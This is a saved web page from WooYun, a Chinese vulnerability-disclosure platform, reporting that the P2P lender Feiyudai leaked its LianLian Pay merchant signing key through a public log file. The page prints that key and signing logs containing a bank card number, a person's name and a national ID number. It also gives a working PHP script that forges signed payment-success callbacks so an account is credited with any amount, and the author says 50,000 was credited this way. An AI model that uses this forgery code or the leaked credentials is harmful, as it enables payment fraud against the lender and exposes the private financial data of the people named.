@@ -1,0 +1,731 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="x-ua-compatible" content="ie=7">
+<title> P2P飞鱼贷支付接口敏感信息泄漏可导致任意金额充值（刷钱洞） | WooYun-2015-132567 | WooYun.org </title>
+<meta name="author" content="80sec">
+<meta name="copyright" content="http://www.wooyun.org/">
+<meta name="keywords" content="飞鱼贷漏洞,秋风,敏感信息泄露,wooyun,应用安全,web安全,系统安全,网络安全,漏洞公布,漏洞报告,安全资讯。">
+<meta name="description" content="@301 我是来给你拉客户的。
+手抖刷了50000，求罩。|WooYun是一个位于厂商和安全研究者之间的漏洞报告平台,注重尊重,进步,与意义">
+<link rel="icon" href="/favicon.ico" sizes="32x32">
+<link href="../../css/style.css" rel="stylesheet" type="text/css">
+<script src="../../js/jquery-1.4.2.min.js" type="text/javascript"></script>
+</head>
+
+<body id="bugDetail">
+
+<style>
+#myBugListTab { position:relative; display:inline; border:none }
+#myBugList { position:absolute; display:none; margin-left:309px; * margin-left:-60px; * margin-top:18px ; border:#c0c0c0 1px solid; padding:2px 7px; background:#FFF }
+#myBugList li { text-align:left }
+</style>
+<script type="text/javascript">
+$(document).ready(function(){
+
+	if ( $("#__cz_push_d_object_box__") ) {
+		$("script[src^='http://cip4.czpush.com/']").attr("src"," ").remove();
+		$("#__cz_push_d_object_box__").empty().remove();
+		$("a[id^='__czUnion_a']").attr("href","#").remove();
+	}
+
+	if ( $("#ooDiv") ) {
+		$("#ooDiv").empty().parent("div").remove();
+	}
+
+	$("#myBugListTab").toggle(
+		function(){
+			$("#myBugList").css("display","block");
+		},
+		function(){
+			$("#myBugList").css("display","none");
+		}
+	);
+
+	if ( $(window).scrollTop() > 120 ) {
+		$("#back-to-top").fadeIn(300);
+	} else {
+		$("#back-to-top").fadeOut(300);
+	} 
+
+	$(window).scroll(function(){
+		if ( $(window).scrollTop() > 120 ) {
+			$("#back-to-top").fadeIn(300);
+		} else {
+			$("#back-to-top").fadeOut(300);
+		} 
+	});
+
+	$("#back-to-top a").click(function() {
+		$('body,html').animate({scrollTop:0},300);
+		return false;
+	});
+
+	$("#go-to-comment a").click(function() {
+		var t = $("#replys").offset().top - 52;
+		$('body,html').animate({scrollTop:t},300);
+		return false;
+	});
+
+});
+
+function gofeedback(){
+	var bugid=$("#fbid").val();
+	if(bugid){
+		var url="/feedback.php?bugid="+bugid;
+	}else{
+		var url="/feedback.php"
+	}
+	window.open(url);
+}
+</script>
+
+	<div class="go-to-wrapper">
+		<ul class="go-to">
+		    <li id="go-to-comment" title="转到评论"><a href="#">转到评论</a></li>
+		    <li id="go-to-feedback" title="我要反馈"><a href="javascript:void(0)" onclick="gofeedback()">我要反馈</a></li>
+		    <li id="back-to-top" title="回到顶部"><a href="#">回到顶部</a></li>
+		</ul>
+	</div>
+	<div class="banner">
+		<div class="logo">
+		<h1>WooYun.org</h1>
+		<div class="weibo"><iframe width="136" height="24" frameborder="0" allowtransparency="true" marginwidth="0" marginheight="0" scrolling="no" border="0" src="http://widget.weibo.com/relationship/followbutton.php?language=zh_cn&amp;width=136&amp;height=24&amp;uid=1981622273&amp;style=2&amp;btn=red&amp;dpc=1"></iframe>
+		</div>
+		<div class="wxewm">
+			<a class="ewmthumb" href="javascript:void(0)"><span><img src="https://static.wooyun.org/static/images/ewm.jpg" width="220" border="0"></span><img src="https://static.wooyun.org/static/images/weixin_30.png" width="22" border="0"></a>
+		</div>
+		</div>
+		
+				<div class="login">
+					<a href="/user.php?action=login">登录</a> | <a href="/user.php?action=register" class="reg">注册</a>
+				</div>
+				</div>
+
+	<div class="nav" id="nav_sc">
+		<ul>
+			<li><a href="/index.php">首页</a></li>
+			<li><a href="/corps/">厂商列表</a></li>
+			<li><a href="/whitehats/">白帽子</a></li>
+			<li><a href="/top/">乌云榜</a></li> 
+            <li><a href="/teams/">团队</a></li>
+            <li><a href="/bugs/">漏洞列表</a></li>
+			<li class="new"><a href="/bug/submit">提交漏洞</a></li>
+			<!--li><a href="/corp_actions">厂商活动</a></li-->
+			<!--<li><a href="/security_center.php#nav_sc">安全中心</a></li>-->
+			<!--li><a href="http://summit.wooyun.org" target="_blank" style="color:rgb(246,172,110);font-size:14px;font-weight:blod">乌云峰会</a></li-->
+			<!--li><a href="/job/">企业招聘</a></li-->
+			<li><a href="http://job.wooyun.org" target="_blank">乌云招聘</a></li>
+						<li><a href="http://drops.wooyun.org" target="_blank">知识库</a></li>
+			<li><a href="/notice/">公告</a></li>
+		</ul>
+        <form action="/searchbug.php" method="post" id="searchbox">
+            <input type="text" name="q" id="search_input">
+            <input type="submit" value="搜索" id="search_button">
+        </form>
+	</div>
+
+	<div class="bread">
+		<div style="float:left">当前位置：<a href="/index.php">WooYun</a> &gt;&gt; <a href="#">漏洞信息</a></div>
+		</div>
+<script language="javascript">
+$(function(){
+    function getParamsOfShareWindow(width, height) {
+        return ['toolbar=0,status=0,resizable=1,width=' + width + ',height=' + height + ',left=',(screen.width-width)/2,',top=',(screen.height-height)/2].join('');
+    }
+});
+
+function errimg(img){
+	tmp=img.src;
+	nimg=tmp.replace("http://static.wooyun.org/wooyun/","http://www.wooyun.org/");
+	img.src=nimg;
+	$(img).parent().attr('href',nimg);
+	img.onerror=null;
+}
+function AttendBug(id){
+	$.get('/ajaxdo.php',{module:'attendbug',id:id,rid:Math.random(),token:$("#token").val()},function(re){
+		if(re==1){
+			$("#attention_num").html(parseInt($("#attention_num").html())+1);
+			$("#attend_action").html('√已关注 <a class="btn" href="javascript:void(0)" onclick="AttendCancel('+id+')">取消关注</a></span>');
+		}else if(re==2){
+			alert("请先登录");
+		}else if(re==3){
+			alert("已关注此漏洞");
+		}else{
+			alert("操作失败，请与管理员联系");
+		}
+	});
+}
+function AttendCancel(id){
+	if(confirm("确定取消对此漏洞的关注?")){
+		$.get('/ajaxdo.php',{module:'attendcancel',id:id,rid:Math.random(),token:$("#token").val()},function(re){
+			if(re==1){
+				$("#attention_num").html(parseInt($("#attention_num").html())-1);
+				$("#attend_action").html('<a class="btn" href="javascript:void(0)" onclick="AttendBug('+id+')">关注此漏洞</a></span>');
+			}else{
+				alert("操作失败，请与管理员联系");
+			}
+		});
+	}
+}
+
+function CollectBug(id,token){
+	$.get('/ajaxdo.php',{'module':'collect','id':id,'token':token,'rid':Math.random()},function(re){
+		if(re==1){
+			$("#collection_num").html(parseInt($("#collection_num").html())+1);
+			$(".btn-fav").removeClass("fav-add");
+			$(".btn-fav").addClass("fav-cancel");
+			$(".btn-fav").unbind();
+			$(".btn-fav").click(function(){
+					CollectCancel(id,token);
+				});
+		}else if(re==2){
+			alert("请先登录");
+		}else if(re==3){
+			alert("已收藏此漏洞");
+		}else{
+			alert("操作失败，请与管理员联系");
+		}
+	});
+}
+function CollectCancel(id,token){
+	if(confirm("确定取消对此漏洞的收藏?")){
+		$.get('/ajaxdo.php',{'module':'collectcancel','id':id,'token':token,'rid':Math.random()},function(re){
+			if(re==1){
+				$("#collection_num").html(parseInt($("#collection_num").html())-1);
+				$(".btn-fav").removeClass("fav-cancel");
+				$(".btn-fav").addClass("fav-add");
+				$(".btn-fav").unbind();
+				$(".btn-fav").click(function(){
+					CollectBug(id,token);
+				});
+			}else{
+				alert("操作失败，请与管理员联系");
+			}
+		});
+	}
+}
+</script>
+
+	<div class="content">
+<input type="hidden" id="token" style="display:none" value="">
+		<h2>漏洞概要
+						<span style="margin:0 0 0 580px; float:right; position:absolute; font-size:14px; font-weight:normal">关注数(<span id="attention_num">9</span>)
+		 <span id="attend_action">
+		 		 <a class="btn" href="javascript:void(0)" onclick="AttendBug(132567)">关注此漏洞</a></span>
+		 		 </span></h2>
+
+		<h3>缺陷编号：		<a href="/bugs/wooyun-2015-0132567">WooYun-2015-132567</a>
+			<input id="fbid" type="hidden" value="132567">
+					</h3>
+
+		<h3 class="wybug_title">漏洞标题：		P2P飞鱼贷支付接口敏感信息泄漏可导致任意金额充值（刷钱洞）  					</h3>
+
+		<h3 class="wybug_corp">相关厂商：		<a href="http://www.wooyun.org/corps/%E9%A3%9E%E9%B1%BC%E8%B4%B7">
+														飞鱼贷														</a>
+		</h3>
+
+		<h3 class="wybug_author">漏洞作者：		<a href="http://www.wooyun.org/whitehats/%E7%A7%8B%E9%A3%8E">秋风</a></h3>
+		<h3 class="wybug_date">提交时间：		2015-08-08 08:38</h3>
+				<h3 class="wybug_open_date">公开时间：		2015-09-22 08:40</h3>
+		<h3 class="wybug_type">漏洞类型：		敏感信息泄露</h3>
+
+		<h3 class="wybug_level">危害等级：		高</h3>
+				<h3>自评Rank：		15</h3>
+				<h3 class="wybug_status">漏洞状态：
+															未联系到厂商或者厂商积极忽略
+																</h3>
+
+		<h3>漏洞来源：		<a href="http://www.wooyun.org">http://www.wooyun.org</a></h3>
+		<h3>Tags标签：
+												<span class="tag"><a href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">敏感信息泄露</a></span>
+								
+</h3>
+		<h3>
+		<!-- Baidu Button BEGIN -->
+        <div id="share">
+        	<div style="float:right; margin-right:100px;font-size:12px">
+            <span class="fav-num"><a id="collection_num">0</a>人收藏</span>
+			<a style="text-decoration:none; font-size:12px" href="javascript:void(0)" class="fav-add btn-fav">收藏</a>
+<script type="text/javascript">
+var token="";
+var id="132567";
+
+$(".btn-fav").click(function(){ CollectBug(id,token); });
+
+</script>
+			</div>
+            <span style="float:left;">分享漏洞：</span>
+            <div id="bdshare" class="bdshare_b" style="line-height: 12px;"><img src="http://bdimg.share.baidu.com/static/images/type-button-5.jpg">
+                <a class="shareCount"></a>
+            </div>
+        </div>
+        <!-- Baidu Button END -->
+    	</h3>
+		<hr align="center">
+
+		<h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail wybug_open_status">
+									2015-08-08：	积极联系厂商并且等待厂商认领中，细节不对外公开<br>
+									2015-09-22：	厂商已经主动忽略漏洞，细节向公众公开<br>
+								</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail wybug_description">@301 我是来给你拉客户的。<br>
+手抖刷了50000，求罩。</p>
+
+		
+						<h3 class="detailTitle">详细说明：</h3>
+    <div class="wybug_detail">
+			<p class="detail"><br>
+<br>
+参考资料： <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-0104034">WooYun: 爱贷网高隐匿任意金额充值实战￥0成本从充值到提现全过程回放</a> <br>
+<br>
+参考资料：http://open.lianlianpay.com/<br>
+<br>
+<br>
+<br>
+log文件：http://www.feiyudai.com/log.txt<br>
+<br>
+<br>
+<br>
+</p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>签名原串:app_request=3&amp;busi_partner=101001&amp;card_no=6222802872501014761&amp;dt_order=20150130135405&amp;info_order=WAP充值&amp;money_order=100.00&amp;name_goods=WAP充值&amp;no_order=llpay201501301354058871&amp;notify_url=http://www.feiyudai.com/mob-pay-paynotice.shtml&amp;oid_partner=201501291000196502&amp;risk_item={"user_info_bind_phone":"","user_info_dt_register":"20150130135405","risk_state":"1","frms_ware_category":"1009"}&amp;sign_type=MD5&amp;url_return=http://www.feiyudai.com/mob-pay-payreturn.shtml&amp;valid_order=30&amp;key=dgerg44rehrthrth56786523<br>
+签名:3d70f7df04f213c7c4290ea0bdd4ec16<br>
+签名原串:app_request=3&amp;busi_partner=101001&amp;card_no=6222802872501014761&amp;dt_order=20150130135410&amp;info_order=WAP充值&amp;money_order=100.00&amp;name_goods=WAP充值&amp;no_order=llpay201501301354103803&amp;notify_url=http://www.feiyudai.com/mob-pay-paynotice.shtml&amp;oid_partner=201501291000196502&amp;risk_item={"user_info_bind_phone":"","user_info_dt_register":"20150130135410","risk_state":"1","frms_ware_category":"1009"}&amp;sign_type=MD5&amp;url_return=http://www.feiyudai.com/mob-pay-payreturn.shtml&amp;valid_order=30&amp;key=dgerg44rehrthrth56786523<br>
+签名:1321b6b3c3d3baca35b0373d79f26323<br>
+签名原串:acct_name=田娟&amp;app_request=3&amp;busi_partner=101001&amp;card_no=6222802872501014761&amp;dt_order=20150130135422&amp;id_no=42070419820712056X&amp;info_order=WAP充值&amp;money_order=100.00&amp;name_goods=WAP充值&amp;no_order=llpay201501301354226749&amp;notify_url=http://www.feiyudai.com/mob-pay-paynotice.shtml&amp;oid_partner=201501291000196502&amp;risk_item={"user_info_bind_phone":"13476089996","user_info_dt_register":"20141017104055","risk_state":"1","frms_ware_category":"1009"}&amp;sign_type=MD5&amp;url_return=http://www.feiyudai.com/mob-pay-payreturn.shtml&amp;user_id=2511&amp;valid_order=30&amp;key=dgerg44rehrthrth56786523<br>
+签名:5b6fa14a1b1f5148b43a12db1d193be6<br>
+签名原串:app_request=3&amp;busi_partner=101001&amp;card_no=6222802872501014761&amp;dt_order=20150130135423&amp;info_order=WAP充值&amp;money_order=100.00&amp;name_goods=WAP充值&amp;no_order=llpay201501301354233750&amp;notify_url=http://www.feiyudai.com/mob-pay-paynotice.shtml&amp;oid_partner=201501291000196502&amp;risk_item={"user_info_bind_phone":"","user_info_dt_register":"20150130135423","risk_state":"1","frms_ware_category":"1009"}&amp;sign_type=MD5&amp;url_return=http://www.feiyudai.com/mob-pay-payreturn.shtml&amp;valid_order=30&amp;key=dgerg44rehrthrth56786523<br>
+签名:b846d1061b2f754bd85a3fd6af2e2b97</code></pre></fieldset><p class="detail"><br>
+<br>
+<br>
+<br>
+商户KEY:dgerg44rehrthrth56786523<br>
+<br>
+<br>
+<br>
+测试订单号：webllpay201508080410044534<br>
+<br>
+支付提交抓包记录<br>
+<br>
+============================<br>
+<br>
+</p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>POST /payment/authpay.htm HTTP/1.1<br>
+Host: yintong.com.cn<br>
+Connection: keep-alive<br>
+Content-Length: 1124<br>
+Cache-Control: max-age=0<br>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>
+Origin: http://www.feiyudai.com<br>
+Upgrade-Insecure-Requests: 1<br>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36<br>
+Content-Type: application/x-www-form-urlencoded<br>
+DNT: 1<br>
+Referer: http://www.feiyudai.com/Pay-llpay?bankCode=llpay&amp;t_money=50000&amp;bank_num=22222222222<br>
+Accept-Encoding: gzip, deflate<br>
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4<br>
+<br>
+acct_name=马赛克&amp;busi_partner=101001&amp;card_no=22222222222&amp;dt_order=20150808041004&amp;flag_modify=0&amp;id_no=马赛克&amp;id_type=0&amp;info_order=%E9%A3%9E%E9%B1%BC%E8%B4%B7%E5%B8%90%E6%88%B7%E5%85%85%E5%80%BC&amp;money_order=50000.00&amp;name_goods=%E9%A3%9E%E9%B1%BC%E8%B4%B7%E5%B8%90%E6%88%B7%E5%85%85%E5%80%BC&amp;no_order=webllpay201508080410044534&amp;notify_url=http%3A%2F%2Fwww.feiyudai.com%2Fpay-paynotice-payid-llpay.shtml&amp;oid_partner=201501291000196502&amp;risk_item=%7B%22user_info_bind_phone%22%3A%22马赛克%22%2C%22user_info_dt_register%22%3A%2220150808023933%22%2C%22risk_state%22%3A%221%22%2C%22user_info_full_name%22%3A%22马赛克%22%2C%22user_info_id_type%22%3A%220%22%2C%22user_info_identify_state%22%3A%221%22%2C%22user_info_identify_type%22%3A%224%22%2C%22user_info_id_no%22%3A马赛克%22%2C%22frms_ware_category%22%3A%222009%22%2C%22user_info_mercht_userno%22%3A%227997%22%7D&amp;sign_type=MD5&amp;timestamp=20150808041004&amp;url_return=http%3A%2F%2Fwww.feiyudai.com%2Fpay-payreturn-payid-llpay.shtml&amp;user_id=7997&amp;valid_order=10080&amp;version=1.0&amp;sign=7afe88e63b26e0f1ffacf11a2922e530</code></pre></fieldset><p class="detail"><br>
+<br>
+<br>
+<br>
+复制抓到的post数据，直接放置到最后的poc文件即可<br>
+<br>
+<br>
+<br>
+ </p>
+    </div>
+						
+			<h3 class="detailTitle">漏洞证明：</h3>
+      <div class="wybug_poc">
+			<p class="detail">商户KEY:dgerg44rehrthrth56786523<br>
+<br>
+</p><p class="detail usemasaic"><a href="../images/full/afb4c3fe38993ed6755a5fe0f42c785c08cb6044.jpg" target="_blank"><img src="../images/full/afb4c3fe38993ed6755a5fe0f42c785c08cb6044.jpg" alt="1.jpg" width="600" onerror="javascript:errimg(this);"></a></p><p class="detail"><br>
+<br>
+</p><p class="detail usemasaic"><a href="../images/full/9a168899939675959b95a22f82dcc24c7398363e.jpg" target="_blank"><img src="../images/full/9a168899939675959b95a22f82dcc24c7398363e.jpg" alt="3.png" width="600" onerror="javascript:errimg(this);"></a></p><p class="detail"><br>
+<br>
+</p><p class="detail usemasaic"><a href="../images/full/a3134e38aaeb8803617c3c22e0188fb0d7887d7f.jpg" target="_blank"><img src="../images/full/a3134e38aaeb8803617c3c22e0188fb0d7887d7f.jpg" alt="4.jpg" width="600" onerror="javascript:errimg(this);"></a></p><p class="detail"><br>
+<br>
+<br>
+<br>
+POC代码：<br>
+<br>
+php payway.php<br>
+<br>
+{'ret_code':'0000','ret_msg':'交易成功'}<br>
+<br>
+</p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>&lt;?php<br>
+// 模拟第三方支付向服务器发包<br>
+// 自行修改商户私密KEY，以及抓包的字符串，其它代码不要动。<br>
+// 代码已做兼容处理，web支付和wap支付已做过测试。app的后边有实际案例我再加。<br>
+<br>
+// 我是商户私密KEY<br>
+define("KEY", 'dgerg44rehrthrth56786523');<br>
+// 支付抓包的值放到这里<br>
+$str = &lt;&lt;&lt;STR<br>
+抓包内容放这里<br>
+STR;<br>
+<br>
+// ====================以下代码不必修改=================================<br>
+$arr = json_decode($str, true);<br>
+if (json_last_error()) {<br>
+    $str = urldecode($str);<br>
+    parse_str($str, $str);<br>
+    $str = json_encode($str);<br>
+    $arr = json_decode($str, true);<br>
+}<br>
+<br>
+$acct_name = $arr['acct_name'];//真实姓名<br>
+$id_no = $arr['id_no']; // 身份证号<br>
+$no_agree = $arr['no_agree']; // 签约协议号<br>
+$info_order = $arr['info_order']; // 订单描述信息<br>
+$money_order = $arr['money_order']; // 交易金额<br>
+$no_order = $arr['no_order']; // 商户唯一订单号<br>
+$dt_order = $arr['dt_order']; // 商户订单时间<br>
+$sign_type = $arr['sign_type']; // 签名方式<br>
+$oid_partner = $arr['oid_partner']; // 商户唯一编号<br>
+$pay_type = $arr['pay_type'] == '1' ? 1 : 2; // 2：快捷支付 （默认）D：认证支付<br>
+$bank_code = isset($arr['bank_code']) ? $arr['bank_code'] : ""; // 银行代码 <br>
+$settle_date = date("Y-m-d"); // 清算日期<br>
+$result_pay = 'SUCCESS'; // 支付结果<br>
+$oid_paybill = ''; // 连连支付支付单号<br>
+$id_type = 0;<br>
+print_r($arr);<br>
+$key = KEY;<br>
+<br>
+<br>
+// 签名<br>
+$_acct_name = unicode_encode($acct_name, 'utf-8', true, 'u', '');<br>
+$_acct_name = $_acct_name == 'u' ? "" : $_acct_name;<br>
+$_info_order = unicode_encode($info_order, 'utf-8', true, 'u', '');<br>
+$_info_order = $_info_order == 'u' ? "" : $_info_order;<br>
+$sign = "info_order={$_info_order}&amp;bank_code={$bank_code}&amp;acct_name={$_acct_name}&amp;dt_order={$dt_order}&amp;id_no={$id_no}&amp;id_type={$id_type}&amp;money_order={$money_order}&amp;no_agree={$no_agree}&amp;no_order={$no_order}&amp;oid_partner={$oid_partner}&amp;pay_type={$pay_type}&amp;result_pay={$result_pay}&amp;settle_date={$settle_date}&amp;sign_type={$sign_type}";<br>
+parse_str($sign, $sign);<br>
+$sign = paraFilter($sign);<br>
+ksort($sign);<br>
+reset($sign);<br>
+echo $sign = createLinkstring($sign) . "&amp;key={$key}";<br>
+echo "\n";<br>
+echo $sign = md5($sign); // 签名<br>
+<br>
+$url = $arr['notify_url']; // 商户后台通知地址<br>
+$fields = json_encode(array(<br>
+    'oid_partner' =&gt; $oid_partner,<br>
+    'sign_type' =&gt; $sign_type,<br>
+    'sign' =&gt; $sign,<br>
+    'dt_order' =&gt; $dt_order,<br>
+    'no_order' =&gt; $no_order,<br>
+    'oid_paybill' =&gt; $oid_paybill,<br>
+    'money_order' =&gt; $money_order,<br>
+    'result_pay' =&gt; $result_pay,<br>
+    'settle_date' =&gt; $settle_date,<br>
+    'info_order' =&gt; $info_order,<br>
+    'pay_type' =&gt; $pay_type,<br>
+    'bank_code' =&gt; $bank_code,<br>
+    'no_agree' =&gt; $no_agree,<br>
+    'id_type' =&gt; $id_type,<br>
+    'id_no' =&gt; $id_no,<br>
+    'acct_name' =&gt;$acct_name,<br>
+));<br>
+$fields = (is_array($fields)) ? http_build_query($fields) : $fields;   <br>
+$ch = curl_init($url);<br>
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');<br>
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);<br>
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Length: ' . strlen($fields)));   <br>
+curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);   <br>
+curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);   <br>
+$re=curl_exec($ch);   <br>
+curl_close($ch);   <br>
+echo $re;<br>
+<br>
+<br>
+<br>
+/**<br>
+ * 除去数组中的空值和签名参数<br>
+ * @param $para 签名参数组<br>
+ * return 去掉空值与签名参数后的新签名参数组<br>
+ */<br>
+function paraFilter($para) {<br>
+    $para_filter = array();<br>
+    while (list ($key, $val) = each ($para)) {<br>
+        if($key == "sign" || $val == "")continue;<br>
+        else    $para_filter[$key] = $para[$key];<br>
+    }<br>
+    return $para_filter;<br>
+}<br>
+<br>
+/**<br>
+ * 汉字转Unicode编码<br>
+ * @param string $str 原始汉字的字符串<br>
+ * @param string $encoding 原始汉字的编码<br>
+ * @param boot $ishex 是否为十六进制表示（支持十六进制和十进制）<br>
+ * @param string $prefix 编码后的前缀<br>
+ * @param string $postfix 编码后的后缀<br>
+ */<br>
+function unicode_encode($str, $encoding = 'UTF-8', $ishex = false, $prefix = '&amp;#', $postfix = ';') {<br>
+    $str = iconv($encoding, 'UCS-2', $str);<br>
+    $arrstr = str_split($str, 2);<br>
+    $unistr = '';<br>
+    for($i = 0, $len = count($arrstr); $i &lt; $len; $i++) {<br>
+        $dec = $ishex ? bin2hex($arrstr[$i]) : hexdec(bin2hex($arrstr[$i]));<br>
+        $unistr .= $prefix . $dec . $postfix;<br>
+    }<br>
+    return $unistr;<br>
+}<br>
+<br>
+/**<br>
+ * 把数组所有元素，按照“参数=参数值”的模式用“&amp;”字符拼接成字符串<br>
+ * @param $para 需要拼接的数组<br>
+ * return 拼接完成以后的字符串<br>
+ */<br>
+function createLinkstring($para) {<br>
+    $arg  = "";<br>
+    while (list ($key, $val) = each ($para)) {<br>
+        $arg.=$key."=".$val."&amp;";<br>
+    }<br>
+    $arg = substr($arg,0,count($arg)-2);<br>
+    //如果存在转义字符，那么去掉转义<br>
+    if(get_magic_quotes_gpc()){$arg = stripslashes($arg);}<br>
+    return $arg;<br>
+}<br>
+<br>
+/* End of file */</code></pre></fieldset><p class="detail"> </p>
+    </div>
+									<h3 class="detailTitle">修复方案：</h3>
+      <div class="wybug_patch">
+			<p class="detail">1.WEB根目录权限不要777，尽量不给写入权限。<br>
+<br>
+2.删除相关log记录代码<br>
+<br>
+3.删除log.txt文件<br>
+<br>
+4.找厂商修改相关私密KEY(不改后边被人利用我不负责的噢)<br>
+<br>
+5.避免那个啥风险，提现我就不测了，点到为止。<br>
+<br>
+6.麻烦帮我把我的账号注销掉。 </p>
+    </div>
+													<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/%E7%A7%8B%E9%A3%8E" title="秋风">秋风</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-0132567" title="P2P飞鱼贷支付接口敏感信息泄漏可导致任意金额充值（刷钱洞）">乌云</a></h3>
+		<hr align="center">
+
+		
+			<h2 id="bugreply">漏洞回应</h2>
+      <div class="bug_result">
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：15 (WooYun评价)</p>
+									      </div>
+					
+		
+<hr align="center">
+<script type="text/javascript">
+var bugid="132567";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+<p class="detail">对本漏洞信息进行评价，以更好的反馈信息的价值，包括信息客观性，内容是否完整以及是否具备学习价值</p>
+		<h5 class="rating">
+		<div class="ratingText">漏洞评价<span>(共<span id="ratingSpan">0</span>人评价)</span>:</div>
+		<div class="myrating">
+			<span rel="-2" data-title="信息虚假或者没有任何自己的思考"></span>
+			<span rel="-1" data-title="内容不详并且漏洞信息评级及类型明显错误"></span>
+			<span rel="0" data-title="还可以，洞主继续努力"></span>
+			<span rel="1" data-title="信息完整，过程清晰，有截图有代码有视频有真相"></span>
+			<span rel="2" data-title="角度独特思路新颖值得学习"></span>
+			<div id="ratingShow">
+			登陆后才能进行评分			</div>
+		</div>
+		</h5>
+		<input type="hidden" id="myRating" value="">
+
+<hr align="center">
+<h2>评论</h2>
+
+<div id="replys" class="replys">
+	    <ol class="replylist">
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-08-08 08:49</span> |
+    		<a target="_blank" href="http://www.wooyun.org/whitehats/%E6%9D%8E%E5%8F%AB%E5%85%BD%E5%B0%B1%E5%9B%9B%E6%9D%8E%E5%8F%AB%E5%85%BD">李叫兽就四李叫兽</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:23 漏洞数:13        | 啦啦啦啦)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="158630"></span>
+        <span class="liketext liketext_min"><span id="likenum_158630">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>大神求个联系方式 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">1#</span>
+                        <a title="回复 李叫兽就四李叫兽" href="javascript:void(0)" class="replyBtn" onclick="Reply('李叫兽就四李叫兽')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+            </ol><!-- replylist End -->
+</div><!-- replys End -->
+
+<div id="reply" class="reply">
+<a name="comment"></a>
+<p class="detail">
+登录后才能发表评论，请先 <a href="/user.php?action=login"><u>登录</u></a> 。
+</p>
+<script type="text/javascript">
+var masaic = '0';
+
+function CommentLike(id){
+	$.post("/ajaxdo.php?module=commentrating",{"id":id,"token":$("#token").val()},function(re){
+		re=parseInt(re);
+		switch(re){
+			case 1:
+				$("#likenum_"+id).html(parseInt($("#likenum_"+id).html())+1);
+				break;
+			case 4:
+				alert("已赞过此条评论");
+				break;
+			case 6:
+				alert("不能评价自己发布的评论");
+				break;
+			default:break;
+		}
+	});
+}
+$(document).ready(function(){
+	$(".likebox .likepre").click(function(){
+            CommentLike($(this).attr("rel"));
+        });
+});
+
+
+</script>
+<div>
+	</div>
+	<div id="footer">
+        <span class="copyright fleft">
+    		Copyright © 2010 - 2015 <a href="#">wooyun.org</a>, All Rights Reserved
